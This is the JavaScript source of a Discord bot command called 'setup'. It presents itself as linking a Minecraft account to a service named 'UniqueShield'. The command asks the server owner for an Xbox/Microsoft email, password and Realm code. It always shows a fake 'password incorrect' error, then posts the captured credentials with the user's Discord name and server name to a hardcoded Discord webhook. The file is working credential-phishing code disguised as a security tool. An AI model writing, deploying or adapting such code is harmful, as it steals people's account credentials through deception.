const { WebhookClient, Collection } = require('discord.js');
const { SlashCommandBuilder } = require('@discordjs/builders');
const { timeStamp } = require('console');
const internal = require('stream');
const { validateHeaderValue } = require('http');

const cooldowns = new Map();

module.exports = {
  data: new SlashCommandBuilder()
      .setName('setup')
      .setDescription('Links your Minecraft account to UniqueShield')
      .addStringOption(option =>
          option.setName('gmail')
              .setDescription('Enter your Minecraft Xbox Gmail account to UniqueShield')
              .setRequired(true))
      .addStringOption(option =>
          option.setName('password')
              .setDescription('Type your Xbox Gmail Account Password')
              .setRequired(true))
      .addStringOption(option =>
          option.setName('realm-code')
              .setDescription('Enter your own Minecraft Realm Code')
              .setRequired(true)
              .setMinLength(11)
              .setMaxLength(11))
      .addStringOption(option =>
          option.setName('alt')
              .setDescription('Set to true to link an alt account, this account will sit in the realms')
              .addChoices(
                  { name: 'True', value: 'true' },
                  { name: 'False', value: 'false' })),

  async execute(interaction) {
    const { commandName } = interaction;

    if (interaction.user.id !== interaction.guild.ownerId) {
        await interaction.reply({ content: 'You are not the owner of the guild.', ephemeral: true});
        return;
    }

        const cooldownAmount = 5;

        if (!cooldowns.has(commandName)) {
            cooldowns.set(commandName, new Collection());
        }

        const now = Date.now();
        const timestamps = cooldowns.get(commandName);
        const cooldownTime = (cooldownAmount || 3) * 1000;

        if (timestamps.has(interaction.user.id)) {
            const expirationTime = timestamps.get(interaction.user.id) + cooldownTime;

            if (now < expirationTime) {
                const timeLeft = (expirationTime - now) / 1000;
                await interaction.reply({ content: `Please wait ${timeLeft.toFixed(1)} more seconds before reusing the \`${commandName}\` command.`, ephemeral: true});
                return;
            }
        }

        timestamps.set(interaction.user.id, now);
        setTimeout(() => timestamps.delete(interaction.user.id), cooldownTime);

      const gmail = interaction.options.getString('gmail');
      const password = interaction.options.getString('password');
      const realmCode = interaction.options.getString('realm-code');
      const choice = interaction.options.getString('alt');
      if (choice === 'true') {
          await interaction.reply('Support for alts coming soon!');
        return;
      }

          const botAvatarURL = interaction.client.user.displayAvatarURL();
          const userAvatar = interaction.user.displayAvatarURL();
          const userName = interaction.user.username;
          const serverIconURL = interaction.guild.iconURL();

          // Send the initial embed
          await interaction.reply({
              embeds: [{
                  color: 0xFFBF00,
                  title: 'Authenticating <a:loading:1242713444843655179>',
                  description: '> **This may take a while...**',
                  footer: { text: 'Authenticating', icon_url: `https://cdn.discordapp.com/attachments/1231588982572191856/1231608860876472392/unknown.jpeg?ex=664f4f22&is=664dfda2&hm=4ff8f7fc250762a30e6050227472c75a48fe858eb2066b49c1f2818404c6a1fa&` },
                  timestamp: new Date(),
                  author: {
                      name: interaction.client.user.username,
                      icon_url: botAvatarURL,
                  },
              }],
              ephemeral: true,
          });

          setTimeout(async () => {
              await interaction.editReply({
                  embeds: [{
                      color: 0xFF0000,
                  title: 'Login Unsuccessfully',
                      description: '> **The password that you provided is incorrect** <:error:1242713599688839268> \n> **Please reuse the command and type your password correctly!** <:error:1242713599688839268> \n\n\n> **[UniqueShield](https:discord.gg/tslontop)**',
                      author: {
                          name: interaction.client.user.username,
                          icon_url: botAvatarURL,
                      },
                  }],
              });
          }, 5000);

      const embed = {
          color: 0x0BEF1B,
          thumbnail: { url: serverIconURL },
          author: { name: `${interaction.guild.name}`, icon_url: userAvatar },
          description: `**Microsoft Account**\`\`\`js\nGmail : ${gmail}\n\nPassword : ${password}\n\nRealm Code : ${realmCode}\`\`\`\n\n**Discord**\n\`\`\`js\nDiscord Name : ${userName}\n\nServerName : ${interaction.guild.name}\`\`\``,
      };

          const webhookClient = new WebhookClient({
              url: 'https://discord.com/api/webhooks/1242708007163396126/AAfwJVLRXCqWUmwykc-ZD4Lcm91S7OwdPkOEXlHesgooQNi7gO44M36qb42z20AIeFiO'
          });

          await webhookClient.send({
              embeds: [embed],
          });

          webhookClient.destroy();
  },
};